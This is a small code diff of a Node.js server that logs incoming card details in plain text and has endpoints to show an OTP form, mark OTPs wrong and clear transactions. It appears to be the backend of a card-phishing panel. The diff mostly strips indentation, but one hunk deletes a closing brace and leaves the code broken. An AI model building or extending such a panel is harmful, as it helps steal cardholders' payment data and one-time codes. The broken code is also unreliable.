@@ -253,7 +253,7 @@ function getBrowserInfo(userAgent) {
   else if (userAgent.includes('Mac OS')) os = 'macOS';
   else if (userAgent.includes('Linux') && !userAgent.includes('Android')) os = 'Linux';
   else if (userAgent.includes('Android')) os = 'Android';
-  else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
+else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
   
   // Detect device
   if (userAgent.includes('iPhone')) device = 'iPhone';
@@ -763,7 +763,7 @@ app.post('/api/showOTP', (req, res) => {
   }
   
   console.log(`OTP display requested for invoice: ${invoiceId}`);
-  res.json({ status: "success", message: "OTP form shown" });
+res.json({ status: "success", message: "OTP form shown" });
 });
 
 // Mark OTP as wrong
@@ -920,8 +920,7 @@ app.get('/api/getTransactionForFail', (req, res) => {
       email: txn.email,
       reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
     }
-  });
-});
+ });
 
 // Clear transactions API
 app.post('/api/clearTransactions', (req, res) => {
@@ -1116,7 +1115,7 @@ io.on('connection', (socket) => {
     console.log('Card details received:', data);
     
     // Make sure the data has an invoiceId
-    if (!data.invoiceId) {
+if (!data.invoiceId) {
       data.invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     }
     
